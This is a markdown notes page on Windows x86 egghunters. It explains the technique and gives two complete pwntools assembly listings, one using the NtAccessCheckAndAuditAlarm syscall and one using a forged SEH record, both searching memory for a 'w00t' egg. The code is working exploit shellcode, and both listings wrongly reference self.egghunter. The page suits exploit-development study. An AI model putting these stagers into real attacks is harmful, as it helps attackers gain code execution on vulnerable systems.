---
title: Egghunters
tags:
  - shellcode
  - egghunter
  - egghunters
  - windows
  - x86
  - assembly
  - seh
---

An **egghunter** is a short program in assembly that we can deliver with our
shellcode to reliably gain code execution if we don't know where our shellcode
will land in process memory upon delivery. Using a particular sentinel value as
a preamble to our shellcode, we can search through each segment of memory to
look for the beginning of our shellcode.

To avoid crashing the program when we encounter access violations for segments
of memory that aren't `R-X`, we can use the `NtAccessCheckAndAuditAlarm` system
call to check if we can access a particular segment. If we can't we ignore and
continue - otherwise we search for our shellcode. Here's some example **Python**
code demonstrating this technique:

```python
from pwn import *

egghunter = (
    "start:"
    # We use the edx register as a memory page counter
    "loop_inc_page:"
    # Go to the last address in the memory page
    "    or dx, 0x0fff;"
    "loop_inc_one:"
    # Increase the memory counter by one
    "    inc edx;"
    "loop_check:"
    # Save the edx register which holds our memory
    # address on the stack
    "    push edx;"
    # Push the negative value of the system
    # call number
    "    mov eax, 0xfffffe3a;"
    # Initialize the call to NtAccessCheckAndAuditAlarm
    "    neg eax;"
    # Perform the system call
    "    int 0x2e;"
    # Check for access violation, 0xc0000005
    # (ACCESS_VIOLATION)
    "    cmp al,05;"
    # Restore the edx register to check
    # later for our egg
    "    pop edx;"
    "loop_check_valid:"
    # If access violation encountered, go to n
    # ext page
    "    je loop_inc_page;"
    "is_egg:"
    # Load egg (w00t in this example) into
    # the eax register
    "    mov eax, 0x74303077;"
    # Initializes pointer with current checked
    # address
    "    mov edi, edx;"
    # Compare eax with doubleword at edi and
    # set status flags
    "    scasd;"
    # No match, we will increase our memory
    # counter by one
    "    jnz loop_inc_one;"
    # First part of the egg detected, check for
    # the second part
    "    scasd;"
    # No match, we found just a location
    # with half an egg
    "    jnz loop_inc_one;"
    "matched:"
    # The edi register points to the first
    # byte of our buffer, we can jump to it
    "    jmp edi;"
)

egghunter = flat([b"\x90" * 8, asm(self.egghunter, arch="i386")])
```

## Using SEH

We can create a fake **Structured Exception Handler (SEH)** structure for our
egghunter that can capture our access violations and recover without releasing
control of the program. The Python code provided below demonstrates this:

```python
from pwn import *

egghunter = (
	"start:"
	# jump to a negative call to dynamically
	# obtain egghunter position
	"    jmp get_seh_address;"
	"build_exception_record:"
	# pop the address of the exception_handler
	# into ecx
	"    pop ecx;"
	# mov signature into eax
	"    mov eax, 0x74303077;"
	# push Handler of the
	# _EXCEPTION_REGISTRATION_RECORD structure
	"    push ecx;"
	# push Next of the
	# _EXCEPTION_REGISTRATION_RECORD structure
	"    push 0xffffffff;"
	# null out ebx
	"    xor ebx, ebx;"
	# overwrite ExceptionList in the TEB with a pointer
	# to our new _EXCEPTION_REGISTRATION_RECORD structure
	"    mov dword ptr fs:[ebx], esp;"
	# subtract 0x04 from the pointer
	# to exception_handler
	"    sub ecx, 0x04;"
	# add 0x04 to ebx
	"    add ebx, 0x04;"
	# overwrite the StackBase in the TEB
	"    mov dword ptr fs:[ebx], ecx;"
	"is_egg:"
	# push 0x02
	"    push 0x02;"
	# pop the value into ecx which will act
	# as a counter
	"    pop ecx;"
	# mov memory address into edi
	"    mov edi, ebx;"
	# check for our signature, if the page is invalid we
	# trigger an exception and jump to our exception_handler function
	"    repe scasd;"
	# if we didn't find signature, increase ebx
	# and repeat
	"    jnz loop_inc_one;"
	# we found our signature and will jump to it
	"    jmp edi;"
	"loop_inc_page:"
	# if page is invalid the exception_handler will
	# update eip to point here and we move to next page
	"    or bx, 0xfff;"
	"loop_inc_one:"
	# increase ebx by one byte
	"    inc ebx;"
	# check for signature again
	"    jmp is_egg;"
	"get_seh_address:"
	# call to a higher address to avoid null bytes & push
	# return to obtain egghunter position
	"    call build_exception_record;"
	# push 0x0c onto the stack
	"    push 0x0c;"
	# pop the value into ecx
	"    pop ecx;"
	# mov into eax the pointer to the CONTEXT
	# structure for our exception
	"    mov eax, [esp+ecx];"
	# mov 0xb8 into ecx which will act as an
	# offset to the eip
	"    mov cl, 0xb8;"
	# increase the value of eip by 0x06 in our CONTEXT
	# so it points to the "or bx, 0xfff" instruction
	# to increase the memory page
	"    add dword ptr ds:[eax+ecx], 0x06;"
	# save return value into eax
	"    pop eax;"
	# increase esp to clean the stack for our call
	"    add esp, 0x10;"
	# push return value back into the stack
	"    push eax;"
	# null out eax to simulate
	# ExceptionContinueExecution return
	"    xor eax, eax;"
	# return
	"    ret;"
)

egghunter = flat([b"\x90" * 8, asm(self.egghunter, arch="i386")])
```

## Related pages

- [[seh-overflows|SEH overflows]]
